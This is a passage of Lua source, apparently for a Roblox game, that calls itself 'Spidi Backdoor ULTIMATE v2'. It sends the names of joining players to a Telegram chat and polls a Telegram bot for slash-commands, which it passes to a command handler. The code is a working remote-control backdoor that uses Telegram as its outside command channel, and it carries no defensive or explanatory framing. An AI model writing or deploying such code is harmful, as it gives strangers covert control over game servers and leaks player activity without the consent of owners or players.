-- ==================== УВЕДОМЛЕНИЕ О НОВЫХ ИГРОКАХ ====================
local oldPlayers = {}
local function checkNewPlayers()
    local currentPlayers = {}
    for _, p in pairs(Players:GetPlayers()) do
        currentPlayers[p.UserId] = p
        if not oldPlayers[p.UserId] then
            sendMessage("🟢 <b>"..p.Name.."</b> зашёл в игру!")
        end
    end
    oldPlayers = currentPlayers
end

spawn(function()
    while true do
        pcall(checkNewPlayers)
        wait(3)
    end
end)

-- ==================== ОПРОС TELEGRAM ====================
local lastId = 0
local function pollUpdates()
    local res = httpRequest("https://api.telegram.org/bot"..BOT_TOKEN.."/getUpdates?offset="..(lastId+1))
    if res and res.Body then
        local ok, data = pcall(HttpService.JSONDecode, HttpService, res.Body)
        if ok and data and data.result then
            for _, update in pairs(data.result) do
                if update.message and update.message.text then
                    local msg = update.message
                    if not CHAT_ID then
                        CHAT_ID = msg.chat.id
                        sendMessage("✅ Spidi Backdoor ULTIMATE v2 запущен!\n👤 Hacker228")
                    end
                    local text = msg.text
                    if text:sub(1,1) == "/" then
                        local parts = {}
                        for w in string.gmatch(text, "%S+") do table.insert(parts, w) end
                        local cmd = parts[1]:sub(2):lower()
                        table.remove(parts, 1)
                        handleCommand(cmd, parts, msg.from.username)
                    end
                end
                if update.update_id then lastId = update.update_id end
            end
        end
    end
end

spawn(function()
    while true do
        pcall(pollUpdates)
        wait(2)
    end
end)

-- ==================== GUI ====================
local function createGUI()
